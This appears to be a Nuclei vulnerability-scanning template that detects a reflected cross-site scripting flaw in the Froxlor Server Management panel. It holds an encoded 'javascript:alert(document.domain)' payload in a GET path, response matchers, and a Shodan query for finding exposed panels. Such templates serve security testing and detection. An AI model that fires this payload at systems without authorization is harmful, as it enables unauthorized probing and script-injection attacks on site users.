id: froxlor-xss

info:
  name: Froxlor Server Management - 跨站脚本漏洞
  author: tess
  severity: medium
  description: Froxlor Server Management - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    cpe: cpe:2.3:a:froxlor:froxlor:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Froxlor Server Management Panel"
    product: froxlor
    vendor: froxlor
  tags: froxlor,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "javascript&colon;alert(document.domain);dd&sol;&sol;"
          - "Froxlor"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
